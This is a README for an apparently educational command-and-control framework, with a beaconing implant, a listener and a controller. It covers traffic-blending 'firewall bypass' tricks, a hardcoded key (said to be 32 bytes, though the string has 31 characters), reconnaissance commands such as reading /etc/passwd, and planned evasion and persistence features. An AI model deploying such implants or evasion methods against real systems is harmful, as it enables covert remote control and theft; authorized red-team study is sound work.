# GhostLink C2 Framework

A complete Command & Control (C2) framework with secure encrypted communication, agent beaconing, and persistent control.

## Disclaimer

This is an **educational C2 framework** for authorized security testing and training only. Unauthorized use is illegal. Only use in controlled environments with proper authorization.


## Architecture

### Phase 1: The Secure Listener (Server)
- **Framework**: Flask
- **Database**: SQLite for agent tracking
- **Port**: 5000 (HTTP)
- **Features**:
  - REST API endpoints for agent communication
  - Database persistence of agents and commands
  - Encrypted request/response handling

### Phase 2: The Agent (Implant)
- **Beaconing**: Checks in every 10 seconds
- **Commands**: Executes shell commands on target machine
- **Error Handling**: Reconnection with backoff on failures
- **Stealth**: Mozilla User-Agent headers to blend with normal traffic

### Phase 3: The Stealth (Encryption & Obfuscation)
- **Encryption**: Fernet (AES-128) symmetric encryption
- **Encoding**: Base64 for safe transmission
- **Protocol**: JSON payload wrapped and encrypted
- **Headers**: Mozilla User-Agent + standard HTTP headers

## Installation

```bash
pip install -r requirements.txt
```

## Usage

### Start the C2 Server
```bash
python Listener.py
```
Server will start on `0.0.0.0:5000` and create `ghostlink.db`

### Run Agent on Target Machine
```bash
python Implant.py
```
Agent will beacon every 10 seconds to the C2 server

### Control Agents (Interactive)
```bash
python Controller.py
```

Commands in interactive mode:
- `agents` - List all connected agents
- `send <agent_id> <command>` - Queue command for agent
- `interact <agent_id>` - Enter interactive mode with agent
- `exit` - Exit controller

### Control Agents (Command Line)
```bash
python Controller.py agents
python Controller.py send Agent_01 "whoami"
```

## API Endpoints

### POST /beacon
Agent beacons to check for commands
```json
{
  "payload": "encrypted_data"
}
```

### POST /result
Agent sends command execution results
```json
{
  "payload": "encrypted_data"
}
```

### GET /agents
List all connected agents
```bash
curl http://localhost:5000/agents
```

### POST /send_command
Queue command for agent
```json
{
  "agent_id": "Agent_01",
  "command": "ls -la"
}
```

## Encryption Details

- **Algorithm**: Fernet (AES-128-CBC with HMAC)
- **Key**: `GhostLink_Secret_Key_32_Bytes!!` (32 bytes)
- **Encoding**: Base64 for safe JSON transmission
- **Direction**: Bidirectional (Agent ↔ Server)

## Database Schema

### agents table
```
- id (PRIMARY KEY)
- agent_id (UNIQUE)
- hostname
- ip_address
- os
- last_seen
- status (active/inactive)
```

### commands table
```
- id (PRIMARY KEY)
- agent_id
- command
- status (pending/completed)
- timestamp
- result
```

## Firewall Bypass Techniques

1. **HTTP Protocol**: Uses standard HTTP POST/GET requests
2. **Mozilla User-Agent**: Appears as legitimate browser traffic
3. **Standard Headers**: Uses normal HTTP headers
4. **Encrypted Payload**: Actual commands hidden in encrypted JSON
5. **Beacon Interval**: Controlled interval (10s) to avoid suspicion

## Command Examples

```bash
# System info
whoami
id
hostname
uname -a

# Directory listing
ls -la
pwd

# File operations
cat /etc/passwd
find . -name "*.txt"

# Network
ifconfig
netstat -an

# Process information
ps aux
```

## Security Features

✓ Encrypted communication (Fernet/AES)
✓ Base64 encoding of payloads
✓ Persistent agent database
✓ Command queueing system
✓ Stealth headers (Mozilla User-Agent)
✓ Error recovery and backoff
✓ Timeout protection (10 seconds)

## Performance

- **Beacon Interval**: 10 seconds (configurable)
- **Command Execution Timeout**: 10 seconds
- **Connection Timeout**: 5 seconds
- **Concurrent Agents**: Unlimited (limited by server resources)


## Future Enhancements

- [ ] Multi-platform support (Windows, macOS, Linux)
- [ ] Process injection for stealth
- [ ] Memory-only execution
- [ ] Proxy support
- [ ] Multi-stage loading
- [ ] Scheduled tasks persistence
- [ ] Registry manipulation (Windows)
- [ ] Custom encoding schemes
- [ ] Machine learning-based anomaly detection evasion
